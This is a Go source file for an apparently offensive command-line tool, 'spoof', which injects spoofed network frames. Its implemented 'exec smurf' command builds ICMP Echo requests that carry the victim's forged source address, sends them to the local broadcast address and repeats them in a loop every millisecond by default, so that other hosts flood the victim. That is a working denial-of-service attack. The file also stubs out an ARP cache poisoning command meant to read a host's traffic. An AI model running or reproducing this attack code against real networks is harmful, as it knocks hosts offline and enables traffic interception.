package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"os"
	"time"

	"github.com/adrianosela/spoof/exec"
	"github.com/adrianosela/spoof/payloads"
	"github.com/adrianosela/spoof/wire"

	"github.com/pkg/errors"
	cli "gopkg.in/urfave/cli.v1"
)

const banner = `
                                         $$$$$$\
                                        $$  __$$\
 $$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  $$ /  \__|
$$  _____|$$  __$$\ $$  __$$\ $$  __$$\ $$$$\
\$$$$$$\  $$ /  $$ |$$ /  $$ |$$ /  $$ |$$  _|
 \____$$\ $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |
$$$$$$$  |$$$$$$$  |\$$$$$$  |\$$$$$$  |$$ |
\_______/ $$  ____/  \______/  \______/ \__|
          $$ |
          $$ |
          \__|
`

var version string // injected at build-time

func smurfValidator(ctx *cli.Context) error {
	return assertSet(ctx, targetFlag)
}

func smurfHandler(ctx *cli.Context) error {
	target := net.ParseIP(ctx.String(name(targetFlag)))
	if target == nil {
		return errors.New("invalid target IP address")
	}

	every, err := time.ParseDuration(ctx.String(name(everyFlag)))
	if err != nil {
		return errors.New("invalid time string given")
	}

	w, err := wire.NewWire(ctx.String(name(ifaceFlag)))
	if err != nil {
		return err
	}
	defer w.Close()

	ip, mask, err := w.IP()
	if err != nil {
		return err
	}
	broadcast := broadcastIP(ip, mask)

	payload, err := payloads.Build(payloads.TypeICMPEcho, payloads.Config{
		SrcIP:  target,
		DstIP:  broadcast,
		SrcMAC: w.MAC(),
		DstMAC: net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
	})
	if err != nil {
		return errors.Wrap(err, "could not build payload")
	}

	banner := "Victim: %s\nUsing Broadcast: %s\nEvery: %s\nPayload:\n---\n%v---\n"
	fmt.Printf(banner, target, broadcast, every.String(), hex.Dump(payload))

	exec.Loop(every, func() {
		if err = w.Inject(payload); err != nil {
			log.Println(err)
		}
	})

	return nil
}

func main() {
	app := cli.NewApp()
	app.Version = version
	app.EnableBashCompletion = true
	app.Usage = "a utility for injecting spoofed frames into a network"
	app.Commands = []cli.Command{
		{
			Name:    "exec",
			Aliases: []string{"x"},
			Usage:   "execute an attack against a target host",
			Subcommands: []cli.Command{
				{
					Name:    "smurf",
					Aliases: []string{"s"},
					Usage:   "make a network overwhelm a host with ICMP Echo replies",
					Flags: []cli.Flag{
						asMandatory(targetFlag),
						withDefault(ifaceFlag, "en0"),
						withDefault(everyFlag, "1ms"),
					},
					Before: smurfValidator,
					Action: smurfHandler,
				},
				{
					Name:    "poison-arp",
					Aliases: []string{"a"},
					Usage:   "poison (spoof) a host's arp cache and read their traffic",
					Flags:   []cli.Flag{
						// TODO: flags
					},
					// TODO: before and action
				},
			},
		},
		{
			Name:    "craft",
			Aliases: []string{"c"},
			Usage:   "craft frames to be injected into the wire",
			Subcommands: []cli.Command{
				{
					Name:  "icmp",
					Usage: "craft icmp frames",
					Flags: []cli.Flag{
						// TODO: flags
					},
					// TODO: before and action
				},
				{
					Name:  "arp",
					Usage: "craft arp frames",
					Flags: []cli.Flag{
						// TODO: flags
					},
					// TODO: before and action
				},
			},
		},
	}

	app.CommandNotFound = func(c *cli.Context, command string) {
		c.App.Run([]string{"help"})
		fmt.Printf("\ncommand \"%s\" does not exist\n", command)
	}

	fmt.Println(banner)
	if err := app.Run(os.Args); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
